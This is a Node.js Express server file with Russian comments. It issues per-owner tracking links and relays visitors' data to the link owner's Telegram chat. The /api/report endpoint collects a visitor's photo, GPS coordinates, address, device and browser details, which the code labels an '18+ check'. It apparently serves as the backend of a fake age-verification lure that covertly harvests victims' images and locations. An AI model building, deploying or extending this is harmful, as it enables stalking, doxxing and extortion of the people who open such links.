// server/index.js
import 'dotenv/config';
import express from 'express';
import path from 'path';
import fs from 'fs';
import Database from 'better-sqlite3';
import { fileURLToPath } from 'url';

// ==== ENV ====
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';          // обязателен
const DEFAULT_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';      // дефолтный чат (опц.)
const STATIC_ORIGIN = process.env.STATIC_ORIGIN || '*';          // твой домен или '*'
const PUBLIC_BASE = process.env.PUBLIC_BASE || STATIC_ORIGIN;    // базовый URL для ссылок
const ADMIN_API_SECRET = process.env.ADMIN_API_SECRET || '';     // секрет для /api/register-link
const DB_PATH = process.env.DB_PATH || './data/links.db';

// ==== Paths / Static ====
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const PUBLIC_DIR = path.join(__dirname, 'public');

// ==== App ====
const app = express();
app.use(express.json({ limit: '15mb' }));
app.use(express.urlencoded({ extended: true, limit: '15mb' }));

// CORS (в проде ограничь до домена)
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', STATIC_ORIGIN);
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS, GET');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

// Раздача статики
app.use(express.static(PUBLIC_DIR));
app.get('/', (_req, res) => res.sendFile(path.join(PUBLIC_DIR, 'index.html')));

// ==== DB init ====
if (!fs.existsSync(path.dirname(DB_PATH))) {
  fs.mkdirSync(path.dirname(DB_PATH), { recursive: true });
}
const db = new Database(DB_PATH);
db.prepare(`
  CREATE TABLE IF NOT EXISTS links (
    slug TEXT PRIMARY KEY,
    chat_id TEXT NOT NULL,
    owner_id TEXT,
    created_at INTEGER NOT NULL,
    disabled INTEGER DEFAULT 0
  )
`).run();

// ==== Helpers ====
function requireAdminSecret(req, res, next) {
  const auth = req.headers['authorization'] || '';
  if (!ADMIN_API_SECRET || auth !== `Bearer ${ADMIN_API_SECRET}`) {
    return res.status(401).json({ ok: false, error: 'Unauthorized' });
  }
  next();
}

function escapeHTML(s = '') {
  return String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

function b64ToBuffer(dataUrl = '') {
  const i = dataUrl.indexOf('base64,');
  const b64 = i >= 0 ? dataUrl.slice(i + 7) : dataUrl;
  return Buffer.from(b64, 'base64');
}

async function sendPhotoToTelegram({ chatId, caption, photoBuf, filename = 'report.jpg' }) {
  if (!BOT_TOKEN) throw new Error('Missing TELEGRAM_BOT_TOKEN');
  if (!chatId) throw new Error('Missing chat_id');
  if (!photoBuf?.length) throw new Error('Empty photo buffer');

  // В Node 18+ есть fetch/FormData/Blob (undici)
  const form = new FormData();
  form.append('chat_id', chatId);
  form.append('caption', caption);
  form.append('parse_mode', 'HTML');
  form.append('photo', new Blob([photoBuf], { type: 'image/jpeg' }), filename);

  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
  const resp = await fetch(url, { method: 'POST', body: form });
  if (!resp.ok) {
    const text = await resp.text().catch(() => '');
    throw new Error(`Telegram ${resp.status}: ${text}`);
  }
  return resp.json();
}

// ==== Health ====
app.get('/health', (_req, res) => res.json({ ok: true }));

// ==== API: регистрация ссылки (бот вызывает) ====
// POST /api/register-link  { slug, chatId, ownerId }
app.post('/api/register-link', requireAdminSecret, (req, res) => {
  try {
    const { slug, chatId, ownerId } = req.body || {};
    if (!slug || !/^[a-z0-9\-]{3,40}$/.test(slug)) {
      return res.status(400).json({ ok: false, error: 'Invalid slug' });
    }
    if (!chatId || !/^-?\d+$/.test(String(chatId))) {
      return res.status(400).json({ ok: false, error: 'Invalid chatId' });
    }

    const now = Date.now();
    const insert = db.prepare('INSERT INTO links(slug, chat_id, owner_id, created_at) VALUES(?,?,?,?)');
    try {
      insert.run(slug, String(chatId), ownerId ? String(ownerId) : null, now);
    } catch {
      return res.status(409).json({ ok: false, error: 'Slug already exists' });
    }

    const base = (PUBLIC_BASE || '').replace(/\/+$/, '');
    const url = `${base}/r/${slug}`;
    res.json({ ok: true, slug, url });
  } catch (e) {
    console.error('[register-link] error:', e);
    res.status(500).json({ ok: false, error: 'Internal' });
  }
});

// ==== Страница по ссылке /r/:slug (внедряем chatId в окно) ====
app.get('/r/:slug', (req, res) => {
  const { slug } = req.params;
  const row = db.prepare('SELECT chat_id, disabled FROM links WHERE slug = ?').get(slug);
  if (!row || row.disabled) return res.status(404).send('Not found');

  let html = fs.readFileSync(path.join(PUBLIC_DIR, 'index.html'), 'utf8');
  const inject = `<script>window.__TARGET_CHAT_ID=${JSON.stringify(row.chat_id)};window.__SLUG=${JSON.stringify(slug)};</script>`;
  html = html.replace('</body>', `${inject}\n</body>`);
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.send(html);
});

// ==== Приём отчёта ====
/**
 * POST /api/report
 * Body: { userAgent, platform, iosVersion, isSafari, geo, address, photoBase64, note, chatId? }
 */
app.post('/api/report', async (req, res) => {
  try {
    const {
      userAgent, platform, iosVersion, isSafari,
      geo, address, photoBase64, note, chatId
    } = req.body || {};

    const chat_id = chatId && /^-?\d+$/.test(String(chatId))
      ? String(chatId)
      : DEFAULT_CHAT_ID;

    if (!BOT_TOKEN) return res.status(500).json({ ok: false, error: 'No BOT token (env TELEGRAM_BOT_TOKEN)' });
    if (!chat_id) return res.status(400).json({ ok: false, error: 'No chat_id (env TELEGRAM_CHAT_ID or body.chatId)' });
    if (!photoBase64) return res.status(400).json({ ok: false, error: 'No photoBase64' });

    const lines = [
      '<b>Новый отчёт 18+ проверка</b>',
      `UA: <code>${escapeHTML(userAgent || '')}</code>`,
      `Platform: <code>${escapeHTML(platform || '')}</code>`,
      `iOS-like: <code>${escapeHTML(iosVersion ?? '')}</code>  Safari: <code>${escapeHTML(isSafari)}</code>`,
      geo ? `Geo: <code>${escapeHTML(`${geo.lat}, ${geo.lon} ±${geo.acc}m`)}</code>` : 'Geo: <code>нет</code>',
      address ? `Addr: <code>${escapeHTML(address)}</code>` : null,
      note ? `Note: <code>${escapeHTML(note)}</code>` : null
    ].filter(Boolean);

    const caption = lines.join('\n');
    const buf = b64ToBuffer(photoBase64);

    const tg = await sendPhotoToTelegram({ chatId: chat_id, caption, photoBuf: buf });
    res.json({ ok: true, result: tg.result });
  } catch (e) {
    console.error('[report] error:', e);
    res.status(500).json({ ok: false, error: e.message || 'Internal error' });
  }
});

// ==== Start ====
const PORT = process.env.PORT || 8080;
app.listen(PORT, () => {
  console.log(`[server] listening on :${PORT}`);
  console.log(`[server] CORS Allow-Origin: ${STATIC_ORIGIN}`);
});
